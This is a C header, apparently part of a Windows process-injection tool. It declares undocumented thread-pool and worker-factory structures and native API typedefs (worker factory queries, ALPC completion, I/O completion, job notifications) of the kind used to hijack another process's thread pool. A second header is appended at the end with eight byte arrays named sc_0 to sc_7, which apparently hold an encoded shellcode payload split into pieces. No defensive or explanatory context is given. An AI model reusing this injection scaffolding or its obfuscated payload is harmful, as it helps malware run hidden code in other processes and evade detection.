#pragma once

#include <windows.h>
#include <stdint.h>
#include "helpers.h"
#include <TlHelp32.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

// ---------//
// Structs //
// --------//

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _TP_TASK_CALLBACKS
{
    void* ExecuteCallback;
    void* Unposted;
} TP_TASK_CALLBACKS, * PTP_TASK_CALLBACKS;

typedef struct _TP_TASK
{
    struct _TP_TASK_CALLBACKS* Callbacks;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char Padding_242[3];
    struct _LIST_ENTRY ListEntry;
} TP_TASK, * PTP_TASK;

typedef struct _TPP_REFCOUNT
{
    volatile INT32 Refcount;
} TPP_REFCOUNT, * PTPP_REFCOUNT;

typedef struct _TPP_CALLER
{
    void* ReturnAddress;
} TPP_CALLER, * PTPP_CALLER;

typedef struct _TPP_PH
{
    struct _TPP_PH_LINKS* Root;
} TPP_PH, * PTPP_PH;

typedef struct _TP_DIRECT
{
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char __PADDING__[3];
} TP_DIRECT, * PTP_DIRECT;

typedef struct _TPP_TIMER_SUBQUEUE
{
    INT64 Expiration;
    struct _TPP_PH WindowStart;
    struct _TPP_PH WindowEnd;
    void* Timer;
    void* TimerPkt;
    struct _TP_DIRECT Direct;
    UINT32 ExpirationWindow;
    INT32 __PADDING__[1];
} TPP_TIMER_SUBQUEUE, * PTPP_TIMER_SUBQUEUE;

typedef struct _TPP_TIMER_QUEUE
{
    struct _RTL_SRWLOCK Lock;
    struct _TPP_TIMER_SUBQUEUE AbsoluteQueue;
    struct _TPP_TIMER_SUBQUEUE RelativeQueue;
    INT32 AllocatedTimerCount;
    INT32 __PADDING__[1];
} TPP_TIMER_QUEUE, * PTPP_TIMER_QUEUE;

typedef struct _TPP_NUMA_NODE
{
    INT32 WorkerCount;
} TPP_NUMA_NODE, * PTPP_NUMA_NODE;

typedef union _TPP_POOL_QUEUE_STATE
{
    union
    {
        INT64 Exchange;
        struct
        {
            INT32 RunningThreadGoal : 16;
            UINT32 PendingReleaseCount : 16;
            UINT32 QueueLength;
        };
    };
} TPP_POOL_QUEUE_STATE, * PTPP_POOL_QUEUE_STATE;

typedef struct _TPP_QUEUE
{
    struct _LIST_ENTRY Queue;
    struct _RTL_SRWLOCK Lock;
} TPP_QUEUE, * PTPP_QUEUE;

typedef struct _FULL_TP_POOL
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_239;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];
    struct _TPP_NUMA_NODE* NumaNode;
    struct _GROUP_AFFINITY* ProximityInfo;
    void* WorkerFactory;
    void* CompletionPort;
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;
    struct _RTL_SRWLOCK ShutdownLock;
    UINT8 ShutdownInitiated;
    UINT8 Released;
    UINT16 PoolFlags;
    long Padding_240;
    struct _LIST_ENTRY PoolLinks;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    volatile INT32 AvailableWorkerCount;
    volatile INT32 LongRunningWorkerCount;
    UINT32 LastProcCount;
    volatile INT32 NodeStatus;
    volatile INT32 BindingCount;
    UINT32 CallbackChecksDisabled : 1;
    UINT32 TrimTarget : 11;
    UINT32 TrimmedThrdCount : 11;
    UINT32 SelectedCpuSetCount;
    long Padding_241;
    struct _RTL_CONDITION_VARIABLE TrimComplete;
    struct _LIST_ENTRY TrimmedWorkerList;
} FULL_TP_POOL, * PFULL_TP_POOL;

typedef struct _ALPC_WORK_ON_BEHALF_TICKET
{
    UINT32 ThreadId;
    UINT32 ThreadCreationTimeLow;
} ALPC_WORK_ON_BEHALF_TICKET, * PALPC_WORK_ON_BEHALF_TICKET;

typedef union _TPP_WORK_STATE
{
    union
    {
        INT32 Exchange;
        UINT32 Insertable : 1;
        UINT32 PendingCallbackCount : 31;
    };
} TPP_WORK_STATE, * PTPP_WORK_STATE;

typedef struct _TPP_ITE_WAITER
{
    struct _TPP_ITE_WAITER* Next;
    void* ThreadId;
} TPP_ITE_WAITER, * PTPP_ITE_WAITER;

typedef struct _TPP_PH_LINKS
{
    struct _LIST_ENTRY Siblings;
    struct _LIST_ENTRY Children;
    INT64 Key;
} TPP_PH_LINKS, * PTPP_PH_LINKS;

typedef struct _TPP_ITE
{
    struct _TPP_ITE_WAITER* First;
} TPP_ITE, * PTPP_ITE;

typedef union _TPP_FLAGS_COUNT
{
    union
    {
        UINT64 Count : 60;
        UINT64 Flags : 4;
        INT64 Data;
    };
} TPP_FLAGS_COUNT, * PTPP_FLAGS_COUNT;

typedef struct _TPP_BARRIER
{
    volatile union _TPP_FLAGS_COUNT Ptr;
    struct _RTL_SRWLOCK WaitLock;
    struct _TPP_ITE WaitList;
} TPP_BARRIER, * PTPP_BARRIER;

typedef struct _TP_CLEANUP_GROUP
{
    struct _TPP_REFCOUNT Refcount;
    INT32 Released;
    struct _RTL_SRWLOCK MemberLock;
    struct _LIST_ENTRY MemberList;
    struct _TPP_BARRIER Barrier;
    struct _RTL_SRWLOCK CleanupLock;
    struct _LIST_ENTRY CleanupList;
} TP_CLEANUP_GROUP, * PTP_CLEANUP_GROUP;


typedef struct _TPP_CLEANUP_GROUP_MEMBER
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_233;
    const struct _TPP_CLEANUP_GROUP_MEMBER_VFUNCS* VFuncs;
    struct _TP_CLEANUP_GROUP* CleanupGroup;
    void* CleanupGroupCancelCallback;
    void* FinalizationCallback;
    struct _LIST_ENTRY CleanupGroupMemberLinks;
    struct _TPP_BARRIER CallbackBarrier;
    union
    {
        void* Callback;
        void* WorkCallback;
        void* SimpleCallback;
        void* TimerCallback;
        void* WaitCallback;
        void* IoCallback;
        void* AlpcCallback;
        void* AlpcCallbackEx;
        void* JobCallback;
    };
    void* Context;
    struct _ACTIVATION_CONTEXT* ActivationContext;
    void* SubProcessTag;
    struct _GUID ActivityId;
    struct _ALPC_WORK_ON_BEHALF_TICKET WorkOnBehalfTicket;
    void* RaceDll;
    FULL_TP_POOL* Pool;
    struct _LIST_ENTRY PoolObjectLinks;
    union
    {
        volatile INT32 Flags;
        UINT32 LongFunction : 1;
        UINT32 Persistent : 1;
        UINT32 UnusedPublic : 14;
        UINT32 Released : 1;
        UINT32 CleanupGroupReleased : 1;
        UINT32 InCleanupGroupCleanupList : 1;
        UINT32 UnusedPrivate : 13;
    };
    long Padding_234;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    enum _TP_CALLBACK_PRIORITY CallbackPriority;
    INT32 __PADDING__[1];
} TPP_CLEANUP_GROUP_MEMBER, * PTPP_CLEANUP_GROUP_MEMBER;

typedef struct _FULL_TP_WORK
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_TASK Task;
    volatile union _TPP_WORK_STATE WorkState;
    INT32 __PADDING__[1];
} FULL_TP_WORK, * PFULL_TP_WORK;

typedef struct _FULL_TP_TIMER
{
    struct _FULL_TP_WORK Work;
    struct _RTL_SRWLOCK Lock;
    union
    {
        struct _TPP_PH_LINKS WindowEndLinks;
        struct _LIST_ENTRY ExpirationLinks;
    };
    struct _TPP_PH_LINKS WindowStartLinks;
    INT64 DueTime;
    struct _TPP_ITE Ite;
    UINT32 Window;
    UINT32 Period;
    UINT8 Inserted;
    UINT8 WaitTimer;
    union
    {
        UINT8 TimerStatus;
        UINT8 InQueue : 1;
        UINT8 Absolute : 1;
        UINT8 Cancelled : 1;
    };
    UINT8 BlockInsert;
    INT32 __PADDING__[1];
} FULL_TP_TIMER, * PFULL_TP_TIMER;

typedef struct _FULL_TP_WAIT
{
    struct _FULL_TP_TIMER Timer;
    void* Handle;
    void* WaitPkt;
    void* NextWaitHandle;
    union _LARGE_INTEGER NextWaitTimeout;
    struct _TP_DIRECT Direct;
    union
    {
        union
        {
            UINT8 AllFlags;
            UINT8 NextWaitActive : 1;
            UINT8 NextTimeoutActive : 1;
            UINT8 CallbackCounted : 1;
            UINT8 Spare : 5;
        };
    } WaitFlags;
    char __PADDING__[7];
} FULL_TP_WAIT, * PFULL_TP_WAIT;

typedef struct _FULL_TP_IO
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_DIRECT Direct;
    void* File;
    volatile INT32 PendingIrpCount;
    INT32 __PADDING__[1];
} FULL_TP_IO, * PFULL_TP_IO;

typedef struct _FULL_TP_ALPC
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* AlpcPort;
    INT32 DeferredSendCount;
    INT32 LastConcurrencyCount;
    union
    {
        UINT32 Flags;
        UINT32 ExTypeCallback : 1;
        UINT32 CompletionListRegistered : 1;
        UINT32 Reserved : 30;
    };
    INT32 __PADDING__[1];
} FULL_TP_ALPC, * PFULL_TP_ALPC;

typedef struct _T2_SET_PARAMETERS_V0
{
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} T2_SET_PARAMETERS, * PT2_SET_PARAMETERS;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation = 0,
    ObjectTypeInformation = 2
} OBJECT_INFORMATION_CLASS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef enum
{
    ProcessHandleInformation = 51
} PROCESS_INFOCLASS;

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG Reserved[22];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION, * PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;


typedef NTSTATUS(NTAPI* _NtSetTimer2)(
    HANDLE TimerHandle,
    PLARGE_INTEGER DueTime,
    PLARGE_INTEGER Period,
    PT2_SET_PARAMETERS Parameters
    );

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


typedef NTSTATUS(NTAPI* _NtQueryObject)(
    HANDLE Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
    );

typedef enum _QUERY_WORKERFACTORYINFOCLASS
{
    WorkerFactoryBasicInformation = 7,
} QUERY_WORKERFACTORYINFOCLASS, * PQUERY_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* _NtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* _ZwSetIoCompletion)(
    HANDLE IoCompletionHandle,
    PVOID KeyContext,
    PVOID ApcContext,
    NTSTATUS IoStatus,
    ULONG_PTR IoStatusInformation
    );

typedef struct _FULL_TP_JOB
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* JobHandle;
    union
    {
        volatile int64_t CompletionState;
        int64_t Rundown : 1;
        int64_t CompletionCount : 63;
    };
    struct _RTL_SRWLOCK RundownLock;
} FULL_TP_JOB, * PFULL_TP_JOB;

typedef NTSTATUS(NTAPI* _TpAllocJobNotification)(
    PFULL_TP_JOB* JobReturn,
    HANDLE HJob,
    PVOID Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
    );

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _ALPC_PORT_ATTRIBUTES
{
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;


typedef NTSTATUS(NTAPI* _NtAlpcCreatePort)(
    PHANDLE PortHandle,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes
    );

typedef struct _TP_ALPC TP_ALPC, * PTP_ALPC;

typedef VOID(NTAPI* PTP_ALPC_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_ALPC Alpc
    );

typedef NTSTATUS(NTAPI* _TpAllocAlpcCompletion)(
    PFULL_TP_ALPC* AlpcReturn,
    HANDLE AlpcPort,
    PTP_ALPC_CALLBACK Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
    );

typedef struct _ALPC_PORT_ASSOCIATE_COMPLETION_PORT
{
    PVOID CompletionKey;
    HANDLE CompletionPort;
} ALPC_PORT_ASSOCIATE_COMPLETION_PORT, * PALPC_PORT_ASSOCIATE_COMPLETION_PORT;

// private
typedef enum _ALPC_PORT_INFORMATION_CLASS
{
    AlpcBasicInformation, // q: out ALPC_BASIC_INFORMATION
    AlpcPortInformation, // s: in ALPC_PORT_ATTRIBUTES
    AlpcAssociateCompletionPortInformation, // s: in ALPC_PORT_ASSOCIATE_COMPLETION_PORT
    AlpcConnectedSIDInformation, // q: in SID
    AlpcServerInformation, // q: inout ALPC_SERVER_INFORMATION
    AlpcMessageZoneInformation, // s: in ALPC_PORT_MESSAGE_ZONE_INFORMATION
    AlpcRegisterCompletionListInformation, // s: in ALPC_PORT_COMPLETION_LIST_INFORMATION
    AlpcUnregisterCompletionListInformation, // s: VOID
    AlpcAdjustCompletionListConcurrencyCountInformation, // s: in ULONG
    AlpcRegisterCallbackInformation, // s: ALPC_REGISTER_CALLBACK // kernel-mode only
    AlpcCompletionListRundownInformation, // s: VOID // 10
    AlpcWaitForPortReferences,
    AlpcServerSessionInformation // q: ALPC_SERVER_SESSION_INFORMATION // since 19H2
} ALPC_PORT_INFORMATION_CLASS;


typedef NTSTATUS(NTAPI* _NtAlpcSetInformation)(
    HANDLE PortHandle,
    ALPC_PORT_INFORMATION_CLASS PortInformationClass,
    PVOID PortInformation,
    ULONG Length
    );

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            USHORT DataLength;
            USHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            USHORT Type;
            USHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
        ULONG CallbackId; // only valid for LPC_REQUEST messages
    };
} PORT_MESSAGE, * PPORT_MESSAGE;
typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE PortHeader;
    BYTE PortMessage[1000];
} ALPC_MESSAGE, * PALPC_MESSAGE;

typedef struct _ALPC_MESSAGE_ATTRIBUTES
{
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef NTSTATUS(NTAPI* _NtAlpcConnectPort)(
    PHANDLE PortHandle,
    PUNICODE_STRING PortName,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes,
    ULONG Flags,
    PSID RequiredServerSid,
    PPORT_MESSAGE ConnectionMessage,
    PSIZE_T BufferLength,
    PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes,
    PALPC_MESSAGE_ATTRIBUTES InMessageAttributes,
    PLARGE_INTEGER Timeout
    );

typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_COMPLETION_INFORMATION
{
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation = 1, // q: FILE_DIRECTORY_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileFullDirectoryInformation, // q: FILE_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBothDirectoryInformation, // q: FILE_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBasicInformation, // q; s: FILE_BASIC_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileStandardInformation, // q: FILE_STANDARD_INFORMATION, FILE_STANDARD_INFORMATION_EX
    FileInternalInformation, // q: FILE_INTERNAL_INFORMATION
    FileEaInformation, // q: FILE_EA_INFORMATION
    FileAccessInformation, // q: FILE_ACCESS_INFORMATION
    FileNameInformation, // q: FILE_NAME_INFORMATION
    FileRenameInformation, // s: FILE_RENAME_INFORMATION (requires DELETE) // 10
    FileLinkInformation, // s: FILE_LINK_INFORMATION
    FileNamesInformation, // q: FILE_NAMES_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileDispositionInformation, // s: FILE_DISPOSITION_INFORMATION (requires DELETE)
    FilePositionInformation, // q; s: FILE_POSITION_INFORMATION
    FileFullEaInformation, // FILE_FULL_EA_INFORMATION
    FileModeInformation, // q; s: FILE_MODE_INFORMATION
    FileAlignmentInformation, // q: FILE_ALIGNMENT_INFORMATION
    FileAllInformation, // q: FILE_ALL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAllocationInformation, // s: FILE_ALLOCATION_INFORMATION (requires FILE_WRITE_DATA)
    FileEndOfFileInformation, // s: FILE_END_OF_FILE_INFORMATION (requires FILE_WRITE_DATA) // 20
    FileAlternateNameInformation, // q: FILE_NAME_INFORMATION
    FileStreamInformation, // q: FILE_STREAM_INFORMATION
    FilePipeInformation, // q; s: FILE_PIPE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FilePipeLocalInformation, // q: FILE_PIPE_LOCAL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FilePipeRemoteInformation, // q; s: FILE_PIPE_REMOTE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileMailslotQueryInformation, // q: FILE_MAILSLOT_QUERY_INFORMATION
    FileMailslotSetInformation, // s: FILE_MAILSLOT_SET_INFORMATION
    FileCompressionInformation, // q: FILE_COMPRESSION_INFORMATION
    FileObjectIdInformation, // q: FILE_OBJECTID_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileCompletionInformation, // s: FILE_COMPLETION_INFORMATION // 30
    FileMoveClusterInformation, // s: FILE_MOVE_CLUSTER_INFORMATION (requires FILE_WRITE_DATA)
    FileQuotaInformation, // q: FILE_QUOTA_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileReparsePointInformation, // q: FILE_REPARSE_POINT_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileNetworkOpenInformation, // q: FILE_NETWORK_OPEN_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAttributeTagInformation, // q: FILE_ATTRIBUTE_TAG_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileTrackingInformation, // s: FILE_TRACKING_INFORMATION (requires FILE_WRITE_DATA)
    FileIdBothDirectoryInformation, // q: FILE_ID_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileIdFullDirectoryInformation, // q: FILE_ID_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileValidDataLengthInformation, // s: FILE_VALID_DATA_LENGTH_INFORMATION (requires FILE_WRITE_DATA and/or SeManageVolumePrivilege)
    FileShortNameInformation, // s: FILE_NAME_INFORMATION (requires DELETE) // 40
    FileIoCompletionNotificationInformation, // q; s: FILE_IO_COMPLETION_NOTIFICATION_INFORMATION (q: requires FILE_READ_ATTRIBUTES) // since VISTA
    FileIoStatusBlockRangeInformation, // s: FILE_IOSTATUSBLOCK_RANGE_INFORMATION (requires SeLockMemoryPrivilege)
    FileIoPriorityHintInformation, // q; s: FILE_IO_PRIORITY_HINT_INFORMATION, FILE_IO_PRIORITY_HINT_INFORMATION_EX (q: requires FILE_READ_DATA)
    FileSfioReserveInformation, // q; s: FILE_SFIO_RESERVE_INFORMATION (q: requires FILE_READ_DATA)
    FileSfioVolumeInformation, // q: FILE_SFIO_VOLUME_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileHardLinkInformation, // q: FILE_LINKS_INFORMATION
    FileProcessIdsUsingFileInformation, // q: FILE_PROCESS_IDS_USING_FILE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileNormalizedNameInformation, // q: FILE_NAME_INFORMATION
    FileNetworkPhysicalNameInformation, // q: FILE_NETWORK_PHYSICAL_NAME_INFORMATION
    FileIdGlobalTxDirectoryInformation, // q: FILE_ID_GLOBAL_TX_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since WIN7 // 50
    FileIsRemoteDeviceInformation, // q: FILE_IS_REMOTE_DEVICE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileUnusedInformation,
    FileNumaNodeInformation, // q: FILE_NUMA_NODE_INFORMATION
    FileStandardLinkInformation, // q: FILE_STANDARD_LINK_INFORMATION
    FileRemoteProtocolInformation, // q: FILE_REMOTE_PROTOCOL_INFORMATION
    FileRenameInformationBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION // since WIN8
    FileLinkInformationBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION
    FileVolumeNameInformation, // q: FILE_VOLUME_NAME_INFORMATION
    FileIdInformation, // q: FILE_ID_INFORMATION
    FileIdExtdDirectoryInformation, // q: FILE_ID_EXTD_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // 60
    FileReplaceCompletionInformation, // s: FILE_COMPLETION_INFORMATION // since WINBLUE
    FileHardLinkFullIdInformation, // q: FILE_LINK_ENTRY_FULL_ID_INFORMATION // FILE_LINKS_FULL_ID_INFORMATION
    FileIdExtdBothDirectoryInformation, // q: FILE_ID_EXTD_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since THRESHOLD
    FileDispositionInformationEx, // s: FILE_DISPOSITION_INFO_EX (requires DELETE) // since REDSTONE
    FileRenameInformationEx, // s: FILE_RENAME_INFORMATION_EX
    FileRenameInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION_EX
    FileDesiredStorageClassInformation, // q; s: FILE_DESIRED_STORAGE_CLASS_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since REDSTONE2
    FileStatInformation, // q: FILE_STAT_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileMemoryPartitionInformation, // s: FILE_MEMORY_PARTITION_INFORMATION // since REDSTONE3
    FileStatLxInformation, // q: FILE_STAT_LX_INFORMATION (requires FILE_READ_ATTRIBUTES and FILE_READ_EA) // since REDSTONE4 // 70
    FileCaseSensitiveInformation, // q; s: FILE_CASE_SENSITIVE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileLinkInformationEx, // s: FILE_LINK_INFORMATION_EX // since REDSTONE5
    FileLinkInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION_EX
    FileStorageReserveIdInformation, // q; s: FILE_STORAGE_RESERVE_ID_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileCaseSensitiveInformationForceAccessCheck, // q; s: FILE_CASE_SENSITIVE_INFORMATION
    FileKnownFolderInformation, // q; s: FILE_KNOWN_FOLDER_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since WIN11
    FileStatBasicInformation, // since 23H2
    FileId64ExtdDirectoryInformation,
    FileId64ExtdBothDirectoryInformation,
    FileIdAllExtdDirectoryInformation,
    FileIdAllExtdBothDirectoryInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;


typedef NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass
    );

//==========================================================================================================
#define _CRT_SECURE_NO_WARNINGS
#pragma once
#include <string.h>

const char sc_0[16] = { 0x61,0x6e,0x54,0x6c,0x73,0x7a,0x54,0x6f,0x31,0x6a,0x69,0x4b,0x58,0x31,0x5a,0x2f };
char sc_1[16] = { 0x54,0x30,0x4a,0x55,0x4f,0x6e,0x30,0x32,0x42,0x35,0x34,0x79,0x4e,0x4e,0x66,0x53 };
const char sc_2[16] = { 0x67,0x4f,0x5a,0x4d,0x2f,0x4e,0x75,0x4a,0x75,0x54,0x56,0x2b,0x43,0x54,0x42,0x4a };
char sc_3[16] = { 0x73,0x32,0x6a,0x5a,0x45,0x4e,0x53,0x43,0x2f,0x6f,0x78,0x42,0x53,0x47,0x38,0x75 };
const char sc_4[16] = { 0x6e,0x6a,0x73,0x4f,0x6d,0x7a,0x2f,0x63,0x34,0x65,0x66,0x51,0x44,0x57,0x5a,0x36 };
char sc_5[16] = { 0x71,0x44,0x36,0x47,0x50,0x4e,0x58,0x6c,0x4e,0x73,0x50,0x7a,0x68,0x4d,0x46,0x72 };
const char sc_6[16] = { 0x30,0x67,0x69,0x62,0x51,0x4c,0x65,0x6b,0x36,0x47,0x7a,0x6c,0x37,0x47,0x46,0x78 };
char sc_7[16] = { 0x47,0x77,0x7a,0x4a,0x35,0x70,0x52,0x39,0x67,0x4d,0x45,0x30,0x76,0x63,0x78,0x6c };
